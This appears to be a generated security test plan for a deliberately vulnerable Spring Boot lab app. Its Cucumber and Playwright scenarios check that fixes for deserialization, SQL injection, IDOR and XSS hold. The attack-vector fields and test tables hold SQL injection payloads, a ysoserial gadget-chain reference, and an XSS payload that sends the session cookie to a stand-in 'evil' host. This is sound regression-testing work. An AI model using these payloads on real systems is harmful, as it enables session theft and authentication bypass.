metadata.frameworkRationale: Java chosen because the application is Spring Boot 3 / Java 17. Cucumber-JVM and Playwright-Java keep one language across the system under test and the test suite, simplifying CI and IDE support.

testCases.title: Insecure Java Native Deserialization (RCE) — endpoint now parses JSON only
testCases.category: A08:2021 - Software and Data Integrity Failures
testCases.description: The original endpoint used ObjectInputStream.readObject() on attacker-supplied base64, exposing the JVM to ysoserial gadget-chain RCE. The fix replaces the body parser with Jackson's readValue(String, Map.class); content-type is now application/json and the response is a small Map describing the parsed payload.
preconditions: Spring Boot app is running on http://localhost:8080
Test has HTTP Basic credentials for alice (alice:alice123) — endpoint requires authentication after VULN-005
expectedOutcome: A 200 response with body {"type":"Map<String,Object>","size":2} for valid JSON input
A gadget chain sent with Content-Type: text/plain is rejected (415 Unsupported Media Type or 400)
Even if a crafted binary stream is sent with Content-Type: application/json, Jackson returns a parse error — no Java deserialization occurs
testCases.attackVector: Send a base64-encoded ysoserial gadget chain (e.g. CommonsCollections1) as the request body to trigger RCE via readObject().
testCases.cucumberFeature:
Feature: VULN-001 - Insecure deserialization is removed
  Background:
    Given the Spring Boot app is running on http://localhost:8080
    And HTTP Basic credentials for alice are available

  @security @vuln-001 @critical @regression
  Scenario: Valid JSON payload is parsed as a Map
    When I POST "{\"name\":\"alice\",\"amount\":100}" to /api/deserialize with Content-Type application/json as alice
    Then the response status is 200
    And the response body contains "Map<String,Object>"
    And the response body contains "size":2

  @security @vuln-001 @critical @regression
  Scenario: Base64 gadget chain no longer executes native deserialization
    When I POST a base64-encoded ysoserial gadget chain to /api/deserialize with Content-Type application/json as alice
    Then the response status is not 200 with an instantiated Java class
    And the response body does not contain "Deserialized:"
    And the server does not instantiate any java.* class from the request

expect.rationale: text/plain is no longer accepted; only application/json is.

stepDefinitions: @When("I POST {string} to /api/deserialize with Content-Type application/json as alice")
@When("I POST a base64-encoded ysoserial gadget chain to /api/deserialize with Content-Type application/json as alice")
@Then("the server does not instantiate any java.* class from the request")

testCases.title: SQL Injection in loginUnsafe — authentication bypass blocked
testCases.description: The original /api/login built the SQL with string concatenation, allowing a payload like username=' OR '1'='1 -- to bypass authentication. The fix replaces the SQL with a named-parameter bind (:username) and verifies the supplied password against the stored BCrypt hash via PasswordEncoder.matches().
preconditions: Seeded users exist: alice/alice123, bob/bob123, admin/admin123
expectedOutcome: Valid credentials return 200 with {id, username, role} (no password field)
SQLi payloads return 401 with {"error":"Invalid credentials"} - no row is matched
Wrong passwords return 401 - bcrypt matches() fails
The response NEVER contains a 'password' key (VULN-009 cross-check)
testCases.attackVector: Send username=' OR '1'='1 with any password to bypass the WHERE clause and authenticate as the first row in the users table.
testCases.cucumberFeature:
Feature: VULN-002 - SQL injection no longer bypasses login
  Background:
    Given the Spring Boot app is running on http://localhost:8080

  @security @vuln-002 @critical @regression
  Scenario: Valid credentials authenticate and return no password field
    When I POST {"username":"alice","password":"alice123"} to /api/login
    Then the response status is 200
    And the response JSON has field "username" with value "alice"
    And the response JSON does not have a "password" field

  @security @vuln-002 @critical @regression
  Scenario Outline: SQL injection payloads are rejected
    When I POST {"username":"<payload>","password":"anything"} to /api/login
    Then the response status is 401
    And the response JSON has field "error" with value "Invalid credentials"
    Examples:
      | payload               |
      | alice' OR '1'='1      |
      | admin'--              |
      | ' OR 1=1 --           |
      | alice'; DROP TABLE--  |

  @security @vuln-002 @critical @regression
  Scenario: Wrong password is rejected
    When I POST {"username":"alice","password":"wrongPassword"} to /api/login
    Then the response status is 401
stepDefinitions: @Then("the response JSON has field {string} with value {string}")
public void jsonFieldEquals(String field, String value) {
@Then("the response JSON does not have a {string} field")

testCases.title: IDOR on /api/profile/{id} and /api/users — ownership and ADMIN role enforced
testCases.description: Originally any authenticated caller could read any user's profile (GET /api/profile/{id}) and any caller could list all users (GET /api/users). The fix restricts /api/users to ADMIN and /api/profile/{id} to the resource owner OR ADMIN. The same ownership rule is applied to /api/transfer's source account.
preconditions: Seeded users exist: alice (id=1), bob (id=2), admin (id=3) - exact IDs may vary, query via admin login if needed
expectedOutcome: alice calling GET /api/profile/{bobId} returns 403 (cannot view another user's profile)
alice calling GET /api/profile/{aliceId} returns 200 with her own user object
admin calling /api/users returns 200 with the full list
alice calling POST /api/transfer with fromId=bobId returns 403 (cannot transfer from another user's account)
testCases.attackVector: Horizontal privilege escalation: log in as a low-privilege user (alice) and read bob's profile or initiate a transfer from bob's account by changing the {id} or fromId parameter.
testCases.cucumberFeature:
Feature: VULN-006 - IDOR on profile and user listing is closed
  Background:
    Given the Spring Boot app is running on http://localhost:8080
    And seeded users alice, bob, and admin exist

  @security @vuln-006 @critical @regression
  Scenario: Anonymous user is denied access to /api/users
    When I GET /api/users with no credentials
    Then the response status is 401

  @security @vuln-006 @critical @regression
  Scenario: Non-admin user cannot enumerate all users
    Given I am authenticated as alice with password alice123
    When I GET /api/users
    Then the response status is 403

  @security @vuln-006 @critical @regression
  Scenario: User cannot read another user's profile
    Given I am authenticated as alice with password alice123
    When I GET /api/profile/2
    Then the response status is 403

  @security @vuln-006 @critical @regression
  Scenario: User can read their own profile
    Given I am authenticated as alice with password alice123
    When I GET /api/profile/1
    Then the response status is 200
    And the response JSON has field "username" with value "alice"

  @security @vuln-006 @critical @regression
  Scenario: Admin can enumerate all users
    Given I am authenticated as admin with password admin123
    When I GET /api/users
    Then the response status is 200
    And the response is a JSON array containing "alice", "bob", "admin"

  @security @vuln-006 @critical @regression
  Scenario: User cannot transfer funds from another user's account
    Given I am authenticated as alice with password alice123
    When I POST {"fromId":2,"toId":1,"amount":50} to /api/transfer
    Then the response status is 403
stepDefinitions: public void authAs(String user, String pass) {
@Then("the response is a JSON array containing {string}")

testCases.title: Reflected XSS in /api/comment/greet — payload HTML-escaped in response
testCases.description: The original handler concatenated the name query parameter directly into an HTML response, allowing reflected XSS such as <script>alert(1)</script>. The fix runs the name through Spring's HtmlUtils.htmlEscape(...) before concatenation, so angle brackets are rendered as < / > entities and the browser does not parse them as markup.
preconditions: Browser launched via Playwright (Chromium) so we can read the live DOM
expectedOutcome: GET /api/comment/greet?name=<script>alert('XSS')</script> returns the literal text with <script> - no script tag is parsed in the DOM
Playwright's page.locator('h1').textContent() matches 'Hello, <script>alert("XSS")</script>!' literally - no alert dialog fires
Content-Security-Policy response header is present (VULN-016 cross-check): default-src 'self'; script-src 'self'; object-src 'none'
testCases.attackVector: Phishing link of the form http://localhost:8080/api/comment/greet?name=<script>document.location='https://evil/?c='+document.cookie</script> to steal the victim's session cookie when rendered in their browser.
testCases.cucumberFeature:
Feature: VULN-007 - Reflected XSS in /api/comment/greet is escaped
  Background:
    Given the Spring Boot app is running on http://localhost:8080

  @security @vuln-007 @high @regression
  Scenario: Benign name renders normally
    When I navigate to /api/comment/greet?name=Alice via Playwright
    Then the page h1 reads "Hello, Alice!"

  @security @vuln-007 @high @regression
  Scenario: Script tag payload is escaped and not executed
    When I navigate to /api/comment/greet?name=<script>alert('XSS')</script> via Playwright
    Then no alert dialog is shown
    And the page h1 contains the literal text "<script>alert('XSS')</script>!"
    And no <script> element was injected into the DOM

  @security @vuln-007 @high @regression
  Scenario: CSP defence-in-depth header is present
    When I navigate to /api/comment/greet?name=Alice via Playwright
    Then the response header Content-Security-Policy contains "default-src 'self'"
    And the response header Content-Security-Policy contains "script-src 'self'"
stepDefinitions: // page.onDialog handler installed in @Before: any dialog throws AssertionError
@Then("the page h1 contains the literal text {string}")
@Then("no <script> element was injected into the DOM")
public void headerContains(String header, String value) {

formLogin.note: Form login at POST /login (Spring Security default) - use this for UI/Thymeleaf flows. JSON API auth uses HTTP Basic.
playwrightExample: // Subsequent requests carry JSESSIONID; Playwright uses the same browser context.

httpBasic.note: Use for /api/* calls. Build header as 'Basic ' + base64('user:pass'). Pre-computed headers are in metadata.basicAuthHeaders.

csrf.note: CSRF is enabled (VULN-011). For cookie-based browser flows, read the XSRF-TOKEN cookie and echo it back as the X-XSRF-TOKEN header on POST/PUT/DELETE.

executionNotes: 1. Build the Spring Boot app first: cd vulnerable-springboot-app-feature-2.1 && mvn -B -ntp -DskipTests package
2. Start the app in the background: mvn spring-boot:run (wait for 'Started Application' on stdout)
3. H2 console is OFF by default. If needed, start with H2_CONSOLE_ENABLED=true
4. Run the BDD suite from the Playwright_Automation folder: mvn test (or npx playwright test for the pure-Playwright path)
5. Seeded users are created on every app start from DataSeeder (alice/alice123, bob/bob123, admin/admin123)

humanFollowUp.title: JWT signing key entropy
humanFollowUp.reason: The fix is a config-only change (env-var placeholder). End-to-end JWT forgery testing requires a deploy-time env var and a JWT verifier endpoint that is not present in this lab. Manual verification: set APP_SECRET_JWT_SIGNING_KEY to a 256-bit SecureRandom value, confirm empty default fails closed in SecretConfig.
manualChecklist: Run app without APP_SECRET_JWT_SIGNING_KEY and verify SecretConfig.jwtSigningKey is empty string
Confirm /vulnerabilities page no longer renders the literal signing key (VULN-018 cross-check)
Generate a 32-byte SecureRandom key for deploy: openssl rand -base64 32

humanFollowUp.title: Verbose SQL logging disabled
humanFollowUp.reason: Config-only fix; no behavioural endpoint to verify end-to-end. Manual verification: tail application logs and confirm no SELECT statements appear at INFO/DEBUG.
manualChecklist: Run with default config and check that 'select' does not appear in stdout
Trigger a /api/login and a /api/transfer and confirm logs do not contain the SQL text or the bound username/password
